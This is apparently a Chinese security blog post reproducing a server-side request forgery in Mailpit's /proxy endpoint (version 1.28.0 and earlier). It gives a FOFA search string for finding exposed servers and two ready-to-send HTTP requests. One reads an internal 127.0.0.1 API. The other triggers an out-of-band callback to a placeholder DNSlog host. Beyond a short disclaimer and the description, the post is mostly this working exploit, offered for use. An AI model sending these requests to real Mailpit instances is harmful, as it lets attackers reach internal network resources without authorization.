#  漏洞复现 || Mailpit服务端请求伪造  
韩文庚
                    韩文庚  我爱林   2026-01-22 14:22  
  
## 免责声明  
  
**我爱林攻防研究院的技术文章仅供参考，****任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得利用网络从事危害国家安全、荣誉和利益****，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**  
## 漏洞描述  
  
      Mailpit是一款电子邮件测试工具，Mailpit在1.28.0及之前版存有漏洞，该漏洞源于/proxy端点服务端请求伪造，允许攻击者未授权访问内部网络资源。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlOhVJ992jL9IEwOaatmST1VAINiaraKuQ8a3zXRH94AeSia1D52ZUZo1EP3ic3YXIiczMUGf7NVgpNlEg/640?wx_fmt=png&from=appmsg "")  
## 资产确定  
```
fofa： "Mailpit"
```  
## 漏洞复现  
  
1.利用如下PO  
C执行得到回显  
  
```
GET /proxy?url=http://127.0.0.1:8025/api/v1/info HTTP/1.1
Host: {{hostname}}
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlOhVJ992jL9IEwOaatmST1V6B8HCsHxbNJ4yYIfpjFwSMiaWPlbO6CCWZmDLO8mKSaRt2iaQtYic1Akg/640?wx_fmt=png&from=appmsg "")  
  
  
2.利用如下PO  
C执行Dnslog外带得到请求  
```
GET /proxy?url=http://[dnslog地址] HTTP/1.1
Host: {{hostname}}
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlOhVJ992jL9IEwOaatmST1VIJVvaeBia2qTWm0BSqAT9Y1q5hDE0NElc5t0sdtBIsIDdG8gAxTKcHA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlOhVJ992jL9IEwOaatmST1VwMAZRLrKBXJj0VZicicptcwnzX9gFq7v2tVfJel1HZ2EFqFQGPpISgiag/640?wx_fmt=png&from=appmsg "")  
  
如有侵权，请联系删除  
  
感谢您抽出  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=2 "")  
  
.  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=3 "")  
  
.  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=4 "")  
  
来阅读本文  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=5 "")  
  
**点它，分享点赞在看都在这里**  
  
  
  
  
